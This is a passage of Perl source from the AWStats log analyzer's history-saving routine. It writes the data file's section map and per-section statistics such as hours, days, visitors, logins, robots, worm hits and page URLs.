        $xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
        $xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
    )
        = ( '', '', '', '', '', '', '', '', '', '', '' );
    if ($xml) {
        (
            $xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
            $xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
        )
            = (
            "</comment><nu>\n", '</nu><recnb>',
            '</recnb><table>',  '<tr><th>',
            '</th><th>',        '</th></tr>',
            '<tr><td>',         '</td><td>',
            '</td></tr>',       '</table><nu>',
            "\n</nu></section>"
        );
    }
    else { $xmlbs = ' '; $xmlhs = ' '; $xmlrs = ' '; }

    my $lastlinenb       = shift || 0;
    my $lastlineoffset   = shift || 0;
    my $lastlinechecksum = shift || 0;
    if ( !$lastlinenb ) {    # This happens for migrate
        $lastlinenb       = $LastLineNumber;
        $lastlineoffset   = $LastLineOffset;
        $lastlinechecksum = $LastLineChecksum;
    }

    if ($Debug) {
        debug(
            " Save_History [sectiontosave=$sectiontosave,year=$year,month=$month,breakdate=$breakdate,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]",
            1
        );
    }
    my $spacebar      = "                    ";
    my %keysinkeylist = ();

    # Header
    if ( $sectiontosave eq 'header' ) {
        if ($xml) { print HISTORYTMP "<version><lib>\n"; }
        print HISTORYTMP "AWSTATS DATA FILE $VERSION\n";
        if ($xml) { print HISTORYTMP "</lib><comment>\n"; }
        print HISTORYTMP
            "# If you remove this file, all statistics for date $breakdate will be lost/reset.\n";
        print HISTORYTMP
            "# Last config file used to build this data file was $FileConfig.\n";
        if ($xml) { print HISTORYTMP "</comment></version>\n"; }
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP
            "# Position (offset in bytes) in this file for beginning of each section for\n";
        print HISTORYTMP
            "# direct I/O access. If you made changes somewhere in this file, you should\n";
        print HISTORYTMP
            "# also remove completely the MAP section (AWStats will rewrite it at next\n";
        print HISTORYTMP "# update).\n";
        print HISTORYTMP "${xmlbb}BEGIN_MAP${xmlbs}"
            . ( 27 + ( scalar keys %TrapInfosForHTTPErrorCodes ) +
            ( scalar @ExtraName ? scalar @ExtraName - 1 : 0 ) +
            ( scalar keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) )
            . "${xmlbe}\n";
        print HISTORYTMP "${xmlrb}POS_GENERAL${xmlrs}";
        $PosInFile{"general"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";

        # When
        print HISTORYTMP "${xmlrb}POS_TIME${xmlrs}";
        $PosInFile{"time"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_VISITOR${xmlrs}";
        $PosInFile{"visitor"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_DAY${xmlrs}";
        $PosInFile{"day"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";

        # Who
        print HISTORYTMP "${xmlrb}POS_DOMAIN${xmlrs}";
        $PosInFile{"domain"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_LOGIN${xmlrs}";
        $PosInFile{"login"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_ROBOT${xmlrs}";
        $PosInFile{"robot"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_WORMS${xmlrs}";
        $PosInFile{"worms"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_EMAILSENDER${xmlrs}";
        $PosInFile{"emailsender"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_EMAILRECEIVER${xmlrs}";
        $PosInFile{"emailreceiver"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";

        # Navigation
        print HISTORYTMP "${xmlrb}POS_SESSION${xmlrs}";
        $PosInFile{"session"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_FILESIZE${xmlrs}";
        $PosInFile{"filesize"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_REQUESTTIME${xmlrs}";
        $PosInFile{"requesttime"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_SIDER${xmlrs}";
        $PosInFile{"sider"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_FILETYPES${xmlrs}";
        $PosInFile{"filetypes"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_DOWNLOADS${xmlrs}";
        $PosInFile{'downloads'} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_OS${xmlrs}";
        $PosInFile{"os"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_BROWSER${xmlrs}";
        $PosInFile{"browser"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_SCREENSIZE${xmlrs}";
        $PosInFile{"screensize"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_UNKNOWNREFERER${xmlrs}";
        $PosInFile{'unknownreferer'} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_UNKNOWNREFERERBROWSER${xmlrs}";
        $PosInFile{'unknownrefererbrowser'} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";

        # Referers
        print HISTORYTMP "${xmlrb}POS_ORIGIN${xmlrs}";
        $PosInFile{"origin"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_SEREFERRALS${xmlrs}";
        $PosInFile{"sereferrals"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_PAGEREFS${xmlrs}";
        $PosInFile{"pagerefs"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_SEARCHWORDS${xmlrs}";
        $PosInFile{"searchwords"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_KEYWORDS${xmlrs}";
        $PosInFile{"keywords"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";

        # Others
        print HISTORYTMP "${xmlrb}POS_MISC${xmlrs}";
        $PosInFile{"misc"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_ERRORS${xmlrs}";
        $PosInFile{"errors"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}POS_CLUSTER${xmlrs}";
        $PosInFile{"cluster"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";

        foreach ( keys %TrapInfosForHTTPErrorCodes ) {
            print HISTORYTMP "${xmlrb}POS_SIDER_$_${xmlrs}";
            $PosInFile{"sider_$_"} = tell HISTORYTMP;
            print HISTORYTMP "$spacebar${xmlre}\n";
        }
        foreach ( 1 .. @ExtraName - 1 ) {
            print HISTORYTMP "${xmlrb}POS_EXTRA_$_${xmlrs}";
            $PosInFile{"extra_$_"} = tell HISTORYTMP;
            print HISTORYTMP "$spacebar${xmlre}\n";
        }
        foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
            print HISTORYTMP "${xmlrb}POS_PLUGIN_$_${xmlrs}";
            $PosInFile{"plugin_$_"} = tell HISTORYTMP;
            print HISTORYTMP "$spacebar${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_MAP${xmlee}\n";
    }

    # General
    if ( $sectiontosave eq 'general' ) {
        $LastUpdate = int("$nowyear$nowmonth$nowday$nowhour$nowmin$nowsec");
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP
            "# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value\n";
        print HISTORYTMP
            "# FirstTime   = Date of first visit for history file\n";
        print HISTORYTMP
            "# LastTime    = Date of last visit for history file\n";
        print HISTORYTMP
            "# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped\n";
        print HISTORYTMP "# TotalVisits = Number of visits\n";
        print HISTORYTMP "# TotalUnique = Number of unique visitors\n";
        print HISTORYTMP "# MonthHostsKnown   = Number of hosts known\n";
        print HISTORYTMP "# MonthHostsUnKnown = Number of hosts unknown\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_GENERAL${xmlbs}8${xmlbe}\n";
        print HISTORYTMP "${xmlrb}LastLine${xmlrs}"
            . ( $LastLine > 0 ? $LastLine : $LastTime{$breakdate} )
            . " $lastlinenb $lastlineoffset $lastlinechecksum${xmlre}\n";
        print HISTORYTMP "${xmlrb}FirstTime${xmlrs}"
            . $FirstTime{$breakdate}
            . "${xmlre}\n";
        print HISTORYTMP "${xmlrb}LastTime${xmlrs}"
            . $LastTime{$breakdate}
            . "${xmlre}\n";
        print HISTORYTMP
            "${xmlrb}LastUpdate${xmlrs}$LastUpdate $NbOfLinesParsed $NbOfOldLines $NbOfNewLines $NbOfLinesCorrupted $NbOfLinesDropped${xmlre}\n";
        print HISTORYTMP "${xmlrb}TotalVisits${xmlrs}";
        $PosInFile{"TotalVisits"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}TotalUnique${xmlrs}";
        $PosInFile{"TotalUnique"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}MonthHostsKnown${xmlrs}";
        $PosInFile{"MonthHostsKnown"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmlrb}MonthHostsUnknown${xmlrs}";
        $PosInFile{"MonthHostsUnknown"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar${xmlre}\n";
        print HISTORYTMP "${xmleb}"
            . ( ${xmleb} ? "\n" : "" )
            . "END_GENERAL${xmlee}\n"
        ; # END_GENERAL on a new line following xml tag because END_ detection does not work like other sections
    }

    # When
    if ( $sectiontosave eq 'time' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP
            "# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_TIME${xmlbs}24${xmlbe}\n";
        for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
            print HISTORYTMP "${xmlrb}$ix${xmlrs}"
                . int( $_time_p[$ix] )
                . "${xmlrs}"
                . int( $_time_h[$ix] )
                . "${xmlrs}"
                . int( $_time_k[$ix] )
                . "${xmlrs}"
                . int( $_time_nv_p[$ix] )
                . "${xmlrs}"
                . int( $_time_nv_h[$ix] )
                . "${xmlrs}"
                . int( $_time_nv_k[$ix] )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_TIME${xmlee}\n";
    }
    if ( $sectiontosave eq 'day' )
    {    # This section must be saved after VISITOR section is read
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Date - Pages - Hits - Bandwidth - Visits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_DAY${xmlbs}"
            . ( scalar keys %DayHits )
            . "${xmlbe}\n";
        my $monthvisits = 0;
        foreach ( sort keys %DayHits ) {
            if ( $_ =~ /^$year$month/i ) { # Found a day entry of the good month
                my $page   = $DayPages{$_}  || 0;
                my $hits   = $DayHits{$_}   || 0;
                my $bytes  = $DayBytes{$_}  || 0;
                my $visits = $DayVisits{$_} || 0;
                print HISTORYTMP
                    "${xmlrb}$_${xmlrs}$page${xmlrs}$hits${xmlrs}$bytes${xmlrs}$visits${xmlre}\n";
                $monthvisits += $visits;
            }
        }
        $MonthVisits{ $year . $month } = $monthvisits;
        print HISTORYTMP "${xmleb}END_DAY${xmlee}\n";
    }

    # Who
    if ( $sectiontosave eq 'domain' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'Domain'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# Domain - Pages - Hits - Bandwidth\n";
        print HISTORYTMP
            "# The $MaxNbOf{'Domain'} first Pages must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_DOMAIN${xmlbs}"
            . ( scalar keys %_domener_h )
            . "${xmlbe}\n";

        # We save page list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList(
            $MaxNbOf{'Domain'}, $MinHit{'Domain'},
            \%_domener_h,       \%_domener_p
        );
        my %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            my $page = $_domener_p{$_} || 0;
            my $bytes = $_domener_k{$_}
                || 0;    # ||0 could be commented to reduce history file size
            print HISTORYTMP
                "${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\n";
        }
        foreach ( keys %_domener_h ) {
            if ( $keysinkeylist{$_} ) { next; }
            my $page = $_domener_p{$_} || 0;
            my $bytes = $_domener_k{$_}
                || 0;    # ||0 could be commented to reduce history file size
            print HISTORYTMP
                "${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_DOMAIN${xmlee}\n";
    }
    if ( $sectiontosave eq 'visitor' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'HostsShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP
            "# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]\n";
        print HISTORYTMP
            "# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished\n";
        print HISTORYTMP
            "# The $MaxNbOf{'HostsShown'} first Hits must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_VISITOR${xmlbs}"
            . ( scalar keys %_host_h )
            . "${xmlbe}\n";
        my $monthhostsknown = 0;

        # We save page list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h,
            \%_host_p );
        my %keysinkeylist = ();
        foreach my $key (@keylist) {
            if ( $key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i ) {
                $monthhostsknown++;
            }
            $keysinkeylist{$key} = 1;
            my $page      = $_host_p{$key} || 0;
            my $bytes     = $_host_k{$key} || 0;
            my $timehostl = $_host_l{$key} || 0;
            my $timehosts = $_host_s{$key} || 0;
            my $lastpage  = $_host_u{$key} || '';
            if ( $timehostl && $timehosts && $lastpage ) {

                if ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {

                    # Session for this user is expired
                    if ($timehosts) {
                        $_session{ GetSessionRange( $timehosts, $timehostl ) }
                            ++;
                    }
                    if ($lastpage) { $_url_x{$lastpage}++; }
                    delete $_host_s{$key};
                    delete $_host_u{$key};
                    print HISTORYTMP
                        "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\n";
                }
                else {

                    # If this user has started a new session that is not expired
                    print HISTORYTMP
                        "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\n";
                }
            }
            else {
                my $hostl = $timehostl || '';
                print HISTORYTMP
                    "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\n";
            }
        }
        foreach my $key ( keys %_host_h ) {
            if ( $keysinkeylist{$key} ) { next; }
            if ( $key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i ) {
                $monthhostsknown++;
            }
            my $page      = $_host_p{$key} || 0;
            my $bytes     = $_host_k{$key} || 0;
            my $timehostl = $_host_l{$key} || 0;
            my $timehosts = $_host_s{$key} || 0;
            my $lastpage  = $_host_u{$key} || '';
            if ( $timehostl && $timehosts && $lastpage ) {
                if ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {

                    # Session for this user is expired
                    if ($timehosts) {
                        $_session{ GetSessionRange( $timehosts, $timehostl ) }
                            ++;
                    }
                    if ($lastpage) { $_url_x{$lastpage}++; }
                    delete $_host_s{$key};
                    delete $_host_u{$key};
                    print HISTORYTMP
                        "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\n";
                }
                else {

                    # If this user has started a new session that is not expired
                    print HISTORYTMP
                        "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\n";
                }
            }
            else {
                my $hostl = $timehostl || '';
                print HISTORYTMP
                    "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\n";
            }
        }
        $MonthUnique{ $year . $month }       = ( scalar keys %_host_p );
        $MonthHostsKnown{ $year . $month }   = $monthhostsknown;
        $MonthHostsUnknown{ $year . $month } =
            ( scalar keys %_host_h ) - $monthhostsknown;
        print HISTORYTMP "${xmleb}END_VISITOR${xmlee}\n";
    }
    if ( $sectiontosave eq 'login' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'LoginShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# Login - Pages - Hits - Bandwidth - Last visit\n";
        print HISTORYTMP
            "# The $MaxNbOf{'LoginShown'} first Pages must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_LOGIN${xmlbs}"
            . ( scalar keys %_login_h )
            . "${xmlbe}\n";

        # We save login list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h,
            \%_login_p );
        my %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_login_p{$_} || 0 )
                . "${xmlrs}"
                . int( $_login_h{$_} || 0 )
                . "${xmlrs}"
                . int( $_login_k{$_} || 0 )
                . "${xmlrs}"
                . ( $_login_l{$_} || '' )
                . "${xmlre}\n";
        }
        foreach ( keys %_login_h ) {
            if ( $keysinkeylist{$_} ) { next; }
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_login_p{$_} || 0 )
                . "${xmlrs}"
                . int( $_login_h{$_} || 0 )
                . "${xmlrs}"
                . int( $_login_k{$_} || 0 )
                . "${xmlrs}"
                . ( $_login_l{$_} || '' )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_LOGIN${xmlee}\n";
    }
    if ( $sectiontosave eq 'robot' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'RobotShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP
            "# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt\n";
        print HISTORYTMP
            "# The $MaxNbOf{'RobotShown'} first Hits must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_ROBOT${xmlbs}"
            . ( scalar keys %_robot_h )
            . "${xmlbe}\n";

        # We save robot list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h,
            \%_robot_h );
        my %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_robot_h{$_} )
                . "${xmlrs}"
                . int( $_robot_k{$_} )
                . "${xmlrs}$_robot_l{$_}${xmlrs}"
                . int( $_robot_r{$_} || 0 )
                . "${xmlre}\n";
        }
        foreach ( keys %_robot_h ) {
            if ( $keysinkeylist{$_} ) { next; }
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_robot_h{$_} )
                . "${xmlrs}"
                . int( $_robot_k{$_} )
                . "${xmlrs}$_robot_l{$_}${xmlrs}"
                . int( $_robot_r{$_} || 0 )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_ROBOT${xmlee}\n";
    }
    if ( $sectiontosave eq 'worms' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'WormsShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# Worm ID - Hits - Bandwidth - Last visit\n";
        print HISTORYTMP
            "# The $MaxNbOf{'WormsShown'} first Hits must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_WORMS${xmlbs}"
            . ( scalar keys %_worm_h )
            . "${xmlbe}\n";

        # We save worm list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h,
            \%_worm_h );
        my %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_worm_h{$_} )
                . "${xmlrs}"
                . int( $_worm_k{$_} )
                . "${xmlrs}$_worm_l{$_}${xmlre}\n";
        }
        foreach ( keys %_worm_h ) {
            if ( $keysinkeylist{$_} ) { next; }
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_worm_h{$_} )
                . "${xmlrs}"
                . int( $_worm_k{$_} )
                . "${xmlrs}$_worm_l{$_}${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_WORMS${xmlee}\n";
    }
    if ( $sectiontosave eq 'emailsender' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# EMail - Hits - Bandwidth - Last visit\n";
        print HISTORYTMP
            "# The $MaxNbOf{'EMailsShown'} first Hits must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_EMAILSENDER${xmlbs}"
            . ( scalar keys %_emails_h )
            . "${xmlbe}\n";

        # We save sender email list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h,
            \%_emails_h );
        my %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_emails_h{$_} || 0 )
                . "${xmlrs}"
                . int( $_emails_k{$_} || 0 )
                . "${xmlrs}$_emails_l{$_}${xmlre}\n";
        }
        foreach ( keys %_emails_h ) {
            if ( $keysinkeylist{$_} ) { next; }
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_emails_h{$_} || 0 )
                . "${xmlrs}"
                . int( $_emails_k{$_} || 0 )
                . "${xmlrs}$_emails_l{$_}${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_EMAILSENDER${xmlee}\n";
    }
    if ( $sectiontosave eq 'emailreceiver' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# EMail - Hits - Bandwidth - Last visit\n";
        print HISTORYTMP
            "# The $MaxNbOf{'EMailsShown'} first hits must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_EMAILRECEIVER${xmlbs}"
            . ( scalar keys %_emailr_h )
            . "${xmlbe}\n";

        # We save receiver email list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h,
            \%_emailr_h );
        my %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_emailr_h{$_} || 0 )
                . "${xmlrs}"
                . int( $_emailr_k{$_} || 0 )
                . "${xmlrs}$_emailr_l{$_}${xmlre}\n";
        }
        foreach ( keys %_emailr_h ) {
            if ( $keysinkeylist{$_} ) { next; }
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_emailr_h{$_} || 0 )
                . "${xmlrs}"
                . int( $_emailr_k{$_} || 0 )
                . "${xmlrs}$_emailr_l{$_}${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_EMAILRECEIVER${xmlee}\n";
    }

    # Navigation
    if ( $sectiontosave eq 'session' )
    {    # This section must be saved after VISITOR section is read
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Session range - Number of visits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_SESSION${xmlbs}"
            . ( scalar keys %_session )
            . "${xmlbe}\n";
        foreach ( keys %_session ) {
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_session{$_} )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_SESSION${xmlee}\n";
    }
    if ($sectiontosave eq 'filesize')
    {   # This section must be saved after VISITOR section is read
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Payload Range - Payload Frequency\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_FILESIZE${xmlbs}"
            . ( scalar keys %_filesize )
            . "${xmlbe}\n";
        foreach ( keys %_filesize) {
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_filesize{$_} )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_FILESIZE${xmlee}\n";

    }
    if ( $sectiontosave eq 'requesttime' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Request Time Range - Request Time Frequency\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_REQUESTTIME${xmlbs}"
            . ( scalar keys %_requesttime )
            . "${xmlbe}\n";
        foreach ( keys %_requesttime ) {
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_requesttime{$_} )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_REQUESTTIME${xmlee}\n";

    }
    if ( $sectiontosave eq 'sider' )
    {    # This section must be saved after VISITOR section is read
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'PageShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# URL - Pages - Bandwidth - Entry - Exit\n";
        print HISTORYTMP
            "# The $MaxNbOf{'PageShown'} first Pages must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_SIDER${xmlbs}"
            . ( scalar keys %_url_p )
            . "${xmlbe}\n";

        # We save page list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p,
            \%_url_p );
        %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            my $newkey = $_;
            $newkey =~ s/([^:])\/\//$1\//g
            ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep http://rep/file.htm
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($newkey)
                . "${xmlrs}"
                . int( $_url_p{$_} || 0 )
                . "${xmlrs}"
                . int( $_url_k{$_} || 0 )
                . "${xmlrs}"
                . int( $_url_e{$_} || 0 )
                . "${xmlrs}"
